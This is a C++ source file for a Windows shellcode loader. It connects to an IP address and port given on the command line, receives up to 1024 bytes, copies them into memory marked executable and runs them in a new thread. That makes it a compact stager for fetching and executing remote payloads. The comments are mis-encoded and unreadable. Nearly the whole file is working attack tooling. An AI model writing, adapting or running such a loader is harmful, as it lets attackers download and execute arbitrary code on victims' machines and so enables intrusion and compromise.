// shellcodeloader.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)
using namespace std;

int main(int argc, char *argv[])
{
	const int BUF_SIZE = 1024;

	WSADATA wsd; 
	SOCKET sHost; 
	SOCKADDR_IN servAddr;
	char buf[BUF_SIZE];
	char bufRecv[BUF_SIZE];
	DWORD dwThreadId; // �߳�ID
	HANDLE hThread; // �߳̾��
	DWORD dwOldProtect; // �ڴ�ҳ����
	int retVal; 
	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		cout << "WSAStartup failed!" << endl;
		return -1;
	}
	sHost = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sHost)
	{
		cout << "socket failed!" << endl;
		WSACleanup();
		return  -1;
	}

	//���÷�������ַ
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr(argv[1]);
	servAddr.sin_port = htons((short)atoi(argv[2]));
	

	//���ӷ�����
	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr));
	if (SOCKET_ERROR == retVal)
	{
		cout << "connect failed!" << endl;
		closesocket(sHost); //�ر��׽���
		WSACleanup(); //�ͷ��׽�����Դ
		return -1;
	}


		//���������������
	ZeroMemory(buf, BUF_SIZE);
	strcpy(buf, "ok");
	
	retVal = send(sHost, buf, strlen(buf), 0);
	if (SOCKET_ERROR == retVal)
	{
		cout << "send failed!" << endl;
		closesocket(sHost); 
		WSACleanup(); 
		return -1;
	}
	cout << "Start download." << endl;
	ZeroMemory(bufRecv, BUF_SIZE);
	Sleep(2000);
	cout << "Downloading." << endl;
	//RecvLine(sHost, bufRecv);
	recv(sHost, bufRecv, BUF_SIZE, 0);
	cout << "OK." << endl;
	Sleep(4000);
	closesocket(sHost);
	WSACleanup();
	
	cout << "Start load" << endl;
	char * shellcode = (char *)VirtualAlloc(
		NULL,
		BUF_SIZE,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE  
		);
	CopyMemory(shellcode, bufRecv, BUF_SIZE);
	//VirtualProtect(bufRecv, BUF_SIZE, PAGE_EXECUTE_READ, &dwOldProtect);
	//Sleep(4000);
	
	hThread = CreateThread(
		NULL, 
		NULL, 
		(LPTHREAD_START_ROUTINE)shellcode, 
		NULL, 
		NULL, 
		&dwThreadId 
		);
	
	WaitForSingleObject(hThread, INFINITE); 
	return 0;
}